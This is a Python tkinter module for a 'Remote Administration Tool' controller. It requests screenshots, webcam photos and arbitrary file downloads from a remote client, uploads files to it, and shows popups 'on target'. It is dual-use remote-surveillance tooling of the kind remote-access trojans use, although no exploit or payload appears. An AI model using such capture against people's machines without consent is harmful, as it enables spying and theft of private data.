"""
gui_features.py - Advanced Features: Screenshot, File Transfer, Popup, Dialogs
"""
import os
import io
import base64
import threading
import tkinter as tk
from tkinter import messagebox, filedialog
from datetime import datetime
from PIL import Image, ImageTk
import gui_globals as g


def log_message(message, level="INFO"):
    g.log_message(message, level)


# ── Screenshot ────────────────────────────────────────────────────────────────

def capture_screenshot():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    g.terminal_output.delete("input_start", "end")
    g.terminal_output.insert(tk.END, "SCREENSHOT\n", "command")
    g.terminal_output.mark_set("input_start", "end-1c")
    import gui_commands as cmds
    threading.Thread(target=cmds.execute_command, args=("SCREENSHOT", "Capture Screenshot"), daemon=True).start()


def capture_webcam():
    """Request webcam photo from client."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    g.terminal_output.delete("input_start", "end")
    g.terminal_output.insert(tk.END, "WEBCAM\n", "command")
    g.terminal_output.insert(tk.END, "⏳ Activating webcam...\n", "loading")
    g.terminal_output.mark_set("input_start", "end-1c")
    import gui_commands as cmds
    threading.Thread(target=cmds.execute_command, args=("WEBCAM", "Webcam Capture"), daemon=True).start()


def show_webcam_photo(img_data_b64, resolution="?"):
    """Display webcam photo in a new popup window."""
    try:
        img_data = base64.b64decode(img_data_b64)
        photo_image = Image.open(io.BytesIO(img_data))

        win = tk.Toplevel(g.root)
        win.title(f"📷 Webcam Capture  —  {resolution}")
        win.configure(bg="#0D0D0D")
        win.resizable(True, True)
        win.pil_image = photo_image  # keep reference

        # ── Header ──────────────────────────────────────────────────────────
        header = tk.Frame(win, bg="#1A1A2E", height=65)
        header.pack(fill="x")
        header.pack_propagate(False)

        lf = tk.Frame(header, bg="#1A1A2E")
        lf.pack(side="left", padx=20, pady=12)
        tk.Label(lf, text="📷  WEBCAM CAPTURE", font=("Segoe UI", 14, "bold"), bg="#1A1A2E", fg="#E94560").pack(anchor="w")
        tk.Label(lf, text=f"Resolution: {resolution}  •  {datetime.now().strftime('%H:%M:%S')}", font=("Segoe UI", 9), bg="#1A1A2E", fg="#90CAF9").pack(anchor="w")

        def save_photo():
            fn = filedialog.asksaveasfilename(
                defaultextension=".jpg",
                filetypes=[("JPEG", "*.jpg"), ("PNG", "*.png"), ("All", "*.*")],
                initialfile=f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            )
            if fn:
                try:
                    win.pil_image.save(fn, quality=95)
                    messagebox.showinfo("Saved", f"Photo saved:\n{fn}")
                    log_message(f"Webcam photo saved: {fn}", "SUCCESS")
                except Exception as e:
                    messagebox.showerror("Error", str(e))

        rf = tk.Frame(header, bg="#1A1A2E")
        rf.pack(side="right", padx=20, pady=10)
        tk.Button(rf, text="📷 New Capture", command=lambda: [win.destroy(), capture_webcam()],
                  font=("Segoe UI", 10, "bold"), bg="#E94560", fg="white", relief="flat",
                  padx=18, pady=8, cursor="hand2").pack(side="left", padx=5)
        tk.Button(rf, text="💾 Save",  command=save_photo,
                  font=("Segoe UI", 10, "bold"), bg="#4CAF50", fg="white", relief="flat",
                  padx=18, pady=8, cursor="hand2").pack(side="left", padx=5)
        tk.Button(rf, text="✗ Close", command=win.destroy,
                  font=("Segoe UI", 10), bg="#555", fg="white", relief="flat",
                  padx=18, pady=8, cursor="hand2").pack(side="left", padx=5)

        # ── Image display ────────────────────────────────────────────────────
        img_w, img_h = photo_image.size
        max_w = min(img_w, g.root.winfo_screenwidth()  - 100)
        max_h = min(img_h, g.root.winfo_screenheight() - 200)
        display = photo_image.copy()
        display.thumbnail((max_w, max_h), Image.Resampling.LANCZOS)

        canvas = tk.Canvas(win, bg="#0D0D0D", highlightthickness=0)
        sv = tk.Scrollbar(win, orient="vertical",   command=canvas.yview)
        sh = tk.Scrollbar(win, orient="horizontal", command=canvas.xview)
        frame = tk.Frame(canvas, bg="#0D0D0D")
        canvas.create_window((0, 0), window=frame, anchor="nw")
        canvas.configure(yscrollcommand=sv.set, xscrollcommand=sh.set)

        photo = ImageTk.PhotoImage(display)
        lbl = tk.Label(frame, image=photo, bg="#0D0D0D")
        lbl.image = photo
        lbl.pack(padx=10, pady=10)
        frame.update_idletasks()
        canvas.configure(scrollregion=canvas.bbox("all"))
        canvas.pack(side="left", fill="both", expand=True)
        sv.pack(side="right", fill="y")
        sh.pack(side="bottom", fill="x")

        dw, dh = display.size
        win.geometry(f"{dw+40}x{dh+100}")
        win.update_idletasks()
        log_message(f"Webcam photo displayed: {resolution}", "SUCCESS")

    except Exception as e:
        log_message(f"Webcam display error: {e}", "ERROR")
        messagebox.showerror("Webcam Error", str(e))


def show_screenshot(img_data_b64):
    try:
        img_data = base64.b64decode(img_data_b64)
        original_image = Image.open(io.BytesIO(img_data))
        screen_w = g.root.winfo_screenwidth()
        screen_h = g.root.winfo_screenheight()
        is_4k = screen_w >= 3840 or screen_h >= 2160
        is_2k = screen_w >= 2560 or screen_h >= 1440
        display_image = original_image.copy()
        if is_4k:
            max_size, win_size = (3200, 2400), "3200x2000"
        elif is_2k:
            max_size, win_size = (2400, 1800), "2400x1600"
        else:
            max_size, win_size = (1920, 1440), "1920x1200"
        orig_w, orig_h = original_image.size
        if orig_w > max_size[0] or orig_h > max_size[1]:
            display_image.thumbnail(max_size, Image.Resampling.LANCZOS)
            from PIL import ImageFilter, ImageEnhance
            display_image = display_image.filter(ImageFilter.UnsharpMask(radius=1, percent=150, threshold=2))
            display_image = ImageEnhance.Contrast(display_image).enhance(1.05)

        win = tk.Toplevel(g.root)
        win.title(f"📸 Screenshot - {orig_w}x{orig_h}")
        win.configure(bg="#1E1E1E")
        win.geometry(win_size)
        win.pil_image = original_image

        def save_img():
            fn = filedialog.asksaveasfilename(
                defaultextension=".png",
                filetypes=[("PNG", "*.png"), ("JPEG", "*.jpg"), ("All", "*.*")],
                initialfile=f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            )
            if fn:
                try:
                    if fn.lower().endswith(('.jpg', '.jpeg')):
                        win.pil_image.save(fn, "JPEG", quality=99, optimize=True)
                    else:
                        win.pil_image.save(fn, "PNG", compress_level=1)
                    size_mb = os.path.getsize(fn) / 1048576
                    messagebox.showinfo("Saved", f"Saved! ({orig_w}x{orig_h}, {size_mb:.2f}MB)")
                except Exception as e:
                    messagebox.showerror("Error", str(e))

        header = tk.Frame(win, bg="#263238", height=70)
        header.pack(fill="x")
        header.pack_propagate(False)
        tf = tk.Frame(header, bg="#263238")
        tf.pack(side="left", padx=20, pady=15)
        tk.Label(tf, text="📸 Screenshot", font=("Segoe UI", 14, "bold"), bg="#263238", fg="white").pack(anchor="w")
        quality = "4K" if is_4k else ("2K" if is_2k else "HD")
        tk.Label(tf, text=f"{orig_w}x{orig_h} • {quality}", font=("Segoe UI", 10), bg="#263238", fg="#90CAF9").pack(anchor="w")
        bf = tk.Frame(header, bg="#263238")
        bf.pack(side="right", padx=20, pady=10)
        tk.Button(bf, text="💾 Save", command=save_img, font=("Segoe UI", 11, "bold"), bg="#4CAF50", fg="white", relief="flat", padx=25, pady=10, cursor="hand2").pack(side="left", padx=5)
        tk.Button(bf, text="🔍 100%", command=lambda: show_original_size(original_image), font=("Segoe UI", 11, "bold"), bg="#2196F3", fg="white", relief="flat", padx=25, pady=10, cursor="hand2").pack(side="left", padx=5)
        tk.Button(bf, text="✗ Close", command=win.destroy, font=("Segoe UI", 11), bg="#757575", fg="white", relief="flat", padx=25, pady=10, cursor="hand2").pack(side="left", padx=5)

        canvas = tk.Canvas(win, bg="#1E1E1E", highlightthickness=0)
        sv = tk.Scrollbar(win, orient="vertical", command=canvas.yview)
        sh = tk.Scrollbar(win, orient="horizontal", command=canvas.xview)
        frame = tk.Frame(canvas, bg="#1E1E1E")
        canvas.create_window((0, 0), window=frame, anchor="nw")
        canvas.configure(yscrollcommand=sv.set, xscrollcommand=sh.set)
        photo = ImageTk.PhotoImage(display_image)
        lbl = tk.Label(frame, image=photo, bg="#1E1E1E")
        lbl.image = photo
        lbl.pack(padx=20, pady=20)
        frame.update_idletasks()
        canvas.configure(scrollregion=canvas.bbox("all"))
        canvas.pack(side="left", fill="both", expand=True)
        sv.pack(side="right", fill="y")
        sh.pack(side="bottom", fill="x")

        def scroll(event):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        canvas.bind_all("<MouseWheel>", scroll)
        log_message(f"Screenshot: {orig_w}x{orig_h}", "SUCCESS")
    except Exception as e:
        log_message(f"Screenshot display error: {e}", "ERROR")
        messagebox.showerror("Error", str(e))


def show_original_size(image):
    try:
        w, h = image.size
        win = tk.Toplevel(g.root)
        win.title("📸 Original Size (100%)")
        win.configure(bg="#1E1E1E")
        sw = min(w + 40, g.root.winfo_screenwidth() - 50)
        sh = min(h + 100, g.root.winfo_screenheight() - 50)
        win.geometry(f"{sw}x{sh}")
        header = tk.Frame(win, bg="#263238", height=60)
        header.pack(fill="x")
        header.pack_propagate(False)
        tk.Label(header, text=f"📸 100% Size  •  {w}x{h}", font=("Segoe UI", 12, "bold"), bg="#263238", fg="white").pack(side="left", padx=20, pady=15)
        tk.Button(header, text="✗ Close", command=win.destroy, font=("Segoe UI", 11), bg="#757575", fg="white", relief="flat", padx=25, pady=8, cursor="hand2").pack(side="right", padx=20, pady=10)
        canvas = tk.Canvas(win, bg="#1E1E1E")
        sv = tk.Scrollbar(win, orient="vertical", command=canvas.yview)
        sh2 = tk.Scrollbar(win, orient="horizontal", command=canvas.xview)
        frame = tk.Frame(canvas, bg="#1E1E1E")
        frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=frame, anchor="nw")
        canvas.configure(yscrollcommand=sv.set, xscrollcommand=sh2.set)
        photo = ImageTk.PhotoImage(image)
        lbl = tk.Label(frame, image=photo, bg="#1E1E1E")
        lbl.image = photo
        lbl.pack(padx=20, pady=20)
        canvas.pack(side="left", fill="both", expand=True, padx=(20, 0), pady=(0, 20))
        sv.pack(side="right", fill="y", pady=(0, 20))
        sh2.pack(side="bottom", fill="x", padx=(20, 0))
    except Exception as e:
        messagebox.showerror("Error", str(e))


# ── File Transfer ─────────────────────────────────────────────────────────────

def save_downloaded_file(filename, data_b64):
    try:
        save_path = filedialog.asksaveasfilename(initialfile=filename, defaultextension=".*")
        if save_path:
            with open(save_path, 'wb') as f:
                f.write(base64.b64decode(data_b64))
            g.terminal_output.insert(tk.END, f"✓ File downloaded: {save_path}\n", "success")
            log_message(f"File downloaded: {save_path}", "SUCCESS")
    except Exception as e:
        g.terminal_output.insert(tk.END, f"❌ Save failed: {str(e)}\n", "error")


def download_file_from_client():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    filepath = tk.simpledialog.askstring("Download File", "Enter file path on client:\n(e.g., C:\\Users\\file.txt)")
    if filepath:
        g.terminal_output.delete("input_start", "end")
        g.terminal_output.insert(tk.END, f"DOWNLOAD:{filepath}\n", "command")
        g.terminal_output.mark_set("input_start", "end-1c")
        import gui_commands as cmds
        threading.Thread(target=cmds.execute_command, args=(f"DOWNLOAD:{filepath}", f"Download: {filepath}"), daemon=True).start()


def upload_file_to_client():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    filepath = filedialog.askopenfilename(title="Select file to upload")
    if filepath:
        try:
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            filename = os.path.basename(filepath)
            cmd = f"UPLOAD:{filename}:{file_data}"
            g.terminal_output.delete("input_start", "end")
            g.terminal_output.insert(tk.END, f"Uploading {filename}...\n", "command")
            g.terminal_output.mark_set("input_start", "end-1c")
            import gui_commands as cmds
            threading.Thread(target=cmds.execute_command, args=(cmd, f"Upload: {filename}"), daemon=True).start()
        except Exception as e:
            messagebox.showerror("Upload Error", str(e))


# ── Popup Messaging ───────────────────────────────────────────────────────────

def send_popup_message():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    title = tk.simpledialog.askstring("Popup Title", "Enter title for the popup:")
    if title is None:
        return
    msg = tk.simpledialog.askstring("Popup Message", "Enter the message to display on target:")
    if msg:
        g.terminal_output.delete("input_start", "end")
        g.terminal_output.insert(tk.END, "Sending popup message...\n", "command")
        g.terminal_output.mark_set("input_start", "end-1c")
        import gui_commands as cmds
        threading.Thread(target=cmds.execute_command, args=(f"POPUP:{title}:{msg}", "Send Popup"), daemon=True).start()


# ── Misc UI ───────────────────────────────────────────────────────────────────

def clear_terminal():
    g.terminal_output.delete("1.0", tk.END)
    g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt")
    g.terminal_output.mark_set("input_start", "end-1c")
    log_message("Terminal cleared", "INFO")


def save_terminal():
    content = g.terminal_output.get("1.0", tk.END)
    if content.strip():
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt"), ("Log", "*.log")])
        if filename:
            with open(filename, "w") as f:
                f.write(content)
            log_message(f"Saved: {filename}", "SUCCESS")


def show_about():
    about = tk.Toplevel(g.root)
    about.title("About Remote Admin Tool")
    about.geometry("500x450")
    about.configure(bg="#1E1E1E")
    about.resizable(False, False)
    tk.Label(about, text="🖥️", font=("Segoe UI", 56), bg="#1E1E1E", fg="#FFFFFF").pack(pady=25)
    tk.Label(about, text="Remote Administration Tool", font=("Segoe UI", 18, "bold"), bg="#1E1E1E", fg="#FFFFFF").pack()
    tk.Label(about, text="Enterprise Edition v2.0", font=("Segoe UI", 11), bg="#1E1E1E", fg="#9E9E9E").pack(pady=8)
    features = tk.Text(about, font=("Segoe UI", 10), bg="#2D2D30", fg="#CCCCCC", height=7, relief="flat", borderwidth=0)
    features.pack(pady=15, padx=40, fill="x")
    features.insert("1.0", "✓ Multiple Client Support\n✓ Screenshot Capture\n✓ File Transfer (Upload/Download)\n✓ Interactive Terminal\n✓ System Control\n✓ Process Management\n✓ Cyberpunk Popup Messaging")
    features.config(state="disabled")
    tk.Label(about, text="© 2026 Nirupam Pal", font=("Segoe UI", 10), bg="#1E1E1E", fg="#757575").pack(pady=15)
    tk.Button(about, text="Close", command=about.destroy, font=("Segoe UI", 11, "bold"), bg="#1976D2", fg="white", relief="flat", padx=40, pady=10, cursor="hand2").pack(pady=15)
